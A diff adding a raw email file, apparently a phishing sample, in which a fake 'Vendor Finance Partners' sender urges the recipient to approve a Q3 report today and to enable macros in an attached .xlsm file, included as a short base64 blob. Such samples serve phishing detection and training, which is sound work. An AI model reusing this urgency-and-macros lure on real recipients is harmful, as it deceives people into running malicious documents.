@@ -1,0 +1,34 @@
+Delivered-To: victim@corp.example
+Received: by mx.google.com with SMTPS id k7l8m9 for <victim@corp.example>; Wed, 26 Aug 2026 15:33:02 -0700 (PDT)
+Received: from mx.vendor-finance-partners.com (mx.vendor-finance-partners.com [5.181.4.66]) by mx.google.com with ESMTPS id n1o2p3 for <victim@corp.example>; Wed, 26 Aug 2026 15:33:00 -0700 (PDT)
+Return-Path: <finance@vendor-finance-partners.com>
+From: "Vendor Finance Partners" <finance@vendor-finance-partners.com>
+To: victim@corp.example
+Subject: Q3 financial report - please review and approve today
+Message-ID: <q3-report@vendor-finance-partners.com>
+Date: Wed, 26 Aug 2026 17:33:00 -0500
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-q3-report"
+
+--bnd-q3-report
+Content-Type: text/plain; charset=utf-8
+
+Hi,
+
+Attached is the Q3 financial report. This needs your review and sign-off
+today so we can close the books on time. Please enable editing and
+macros to see the full breakdown.
+
+Thanks,
+Finance Team
+
+--bnd-q3-report
+Content-Type: application/vnd.ms-excel.sheet.macroEnabled.12; name="Q3_Financial_Report.xlsm"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Q3_Financial_Report.xlsm"
+
+UEsDBBQACAgIAKtqjlMAAAAAAAAAAAAAAAALAAAAX3JlbHMvLnJlbHOtks9OwzAMxu99isj3
+1d1ACKGmuyCk3RCiPIBJ3D+iiaPYK9vb47IdyGATh0mR7Xzf75PtdvfR1uwdA1UQCpnlqWQY
+NFgVykK+Hu5XG7lLU2jP6oyRIepUUCFGf6+U1zU2SnPr0IfMHkKjYtjCWlmtL9UaVL5ObxV+
+Z8jT4bqLQY6vCw==
+--bnd-q3-report--
